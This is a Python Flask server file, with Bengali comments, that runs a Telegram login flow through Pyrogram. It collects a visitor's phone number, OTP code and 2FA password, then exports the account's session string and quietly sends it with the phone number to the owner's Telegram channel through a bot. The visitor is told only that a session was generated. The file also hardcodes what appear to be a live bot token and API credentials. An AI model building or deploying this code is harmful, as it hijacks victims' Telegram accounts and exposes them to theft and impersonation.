import os
import asyncio
import threading
import traceback
import requests
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PasswordHashInvalid
)

app = Flask(__name__)
CORS(app)

# টেলিগ্রাম এবং এপিআই কনফিগারেশন
API_ID = int(os.environ.get("API_ID", 33511945))
API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")

BOT_TOKEN = "8613982412:AAEzoWkhawmQuRyAHh89jj68gru2oIowL5E"
OWNER_CHAT_ID = "-1003962414788"  # নতুন চ্যানেল আইডি
ADMIN_ID = 6034439625             # অ্যাডমিন আইডি

active_clients = {}
total_logged_in_users = 0  # মোট সফল লগইনের কাউন্ট

def send_telegram_message(chat_id, text):
    """টেলিগ্রাম চ্যানেল বা চ্যাটে মেসেজ পাঠানোর ফাংশন"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "Markdown"
        }
        response = requests.post(url, json=payload, timeout=15)
        print("Telegram API Response:", response.text)
    except Exception as e:
        print("Telegram Notification Error:", traceback.format_exc())

# ব্যাকগ্রাউন্ডে একটি স্থায়ী Event Loop তৈরি ও চালু করা
bg_loop = asyncio.new_event_loop()

def start_background_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

loop_thread = threading.Thread(target=start_background_loop, args=(bg_loop,), daemon=True)
loop_thread.start()

def run_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, bg_loop)
    return future.result()


@app.route('/', methods=['GET'])
def home():
    if os.path.exists('index.html'):
        return send_file('index.html')
    return "index.html not found", 404


@app.route('/verify', methods=['GET'])
def verify_page():
    if os.path.exists('verify.html'):
        return send_file('verify.html')
    return "verify.html not found", 404


# নতুন যোগ করা ড্যাশবোর্ড রাউট
@app.route('/dashboard.html', methods=['GET'])
def dashboard_page():
    if os.path.exists('dashboard.html'):
        return send_file('dashboard.html')
    return "dashboard.html not found", 404


@app.route('/send-code', methods=['POST'])
def send_code():
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()

    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400

    try:
        session_name = f"session_{phone.replace('+', '')}"

        async def _send():
            if phone in active_clients:
                try:
                    await active_clients[phone]["client"].disconnect()
                except Exception:
                    pass

            client = Client(
                session_name,
                api_id=API_ID,
                api_hash=API_HASH,
                in_memory=True
            )
            await client.connect()
            sent_code = await client.send_code(phone)

            active_clients[phone] = {
                "client": client,
                "phone_code_hash": sent_code.phone_code_hash
            }
            return sent_code.phone_code_hash

        phone_code_hash = run_async(_send())

        return jsonify({
            "status": "success",
            "message": "OTP code sent to Telegram!",
            "phone_code_hash": phone_code_hash
        })
    except Exception as e:
        print("SEND CODE ERROR:", traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 400


@app.route('/verify-code', methods=['POST'])
def verify_code():
    global total_logged_in_users
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()
    code = str(data.get('code', '')).strip()
    password = data.get('password')

    if not phone or not code:
        return jsonify({"status": "error", "message": "Phone and Code are required"}), 400

    if phone not in active_clients:
        return jsonify({"status": "error", "message": "Session expired or please request code again."}), 400

    client_data = active_clients[phone]
    client = client_data["client"]
    phone_code_hash = client_data["phone_code_hash"]

    try:
        async def _verify():
            try:
                await client.sign_in(phone, phone_code_hash, code)
            except SessionPasswordNeeded:
                if not password:
                    return {"status": "2fa_required"}
                await client.check_password(str(password))

            session_string = await client.export_session_string()
            await client.disconnect()
            return {"status": "success", "session_string": session_string}

        res = run_async(_verify())

        if res and res.get("status") == "2fa_required":
            return jsonify({"status": "2fa_required", "message": "2FA Password required"})

        if res and res.get("status") == "success":
            total_logged_in_users += 1
            session_string = res.get("session_string")

            # নতুন টেলিগ্রাম চ্যানেলে সেশন এবং ইউজারের তথ্য পাঠিয়ে দেওয়া
            msg = (
                f"🎉 *New Telegram Login Successful!*\n\n"
                f"📱 *Phone:* `{phone}`\n"
                f"📊 *Total Logged In:* `{total_logged_in_users}`\n\n"
                f"🔑 *Session String:*\n`{session_string}`"
            )
            send_telegram_message(OWNER_CHAT_ID, msg)

        active_clients.pop(phone, None)
        return jsonify({"status": "success", "message": "Session generated successfully!"})

    except PhoneCodeInvalid:
        return jsonify({"status": "error", "message": "Invalid OTP code!"}), 400
    except PhoneCodeExpired:
        active_clients.pop(phone, None)
        return jsonify({"status": "error", "message": "OTP code has expired!"}), 400
    except PasswordHashInvalid:
        return jsonify({"status": "error", "message": "Incorrect 2FA Password!"}), 400
    except Exception as e:
        print("VERIFY ERROR DETAILS:", traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 400


# টেলিগ্রাম বটের ইনকামিং কমান্ড হ্যান্ডেল করার জন্য Webhook রুট
@app.route(f'/{BOT_TOKEN}', methods=['POST'])
def telegram_webhook():
    try:
        data = request.get_json(silent=True) or {}
        if "message" in data:
            message = data["message"]
            chat_id = message["chat"]["id"]
            user_id = message["from"]["id"]
            text = message.get("text", "").strip()

            # শুধু নির্দিষ্ট অ্যাডমিন আইডি থেকে কমান্ড দিলে উত্তর দেবে
            if text == "/stats" or text == "/start":
                if user_id == ADMIN_ID or str(chat_id) == str(OWNER_CHAT_ID):
                    reply_msg = (
                        f"🤖 *Bot Status & Stats*\n\n"
                        f"📊 *Total Logged In Users:* `{total_logged_in_users}`\n"
                        f"✅ *System Status:* `Online & Running`"
                    )
                    send_telegram_message(chat_id, reply_msg)
    except Exception as e:
        print("Webhook Error:", e)
    return "OK", 200


@app.route('/stats', methods=['GET'])
def get_stats():
    return jsonify({"total_users_logged_in": total_logged_in_users})


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
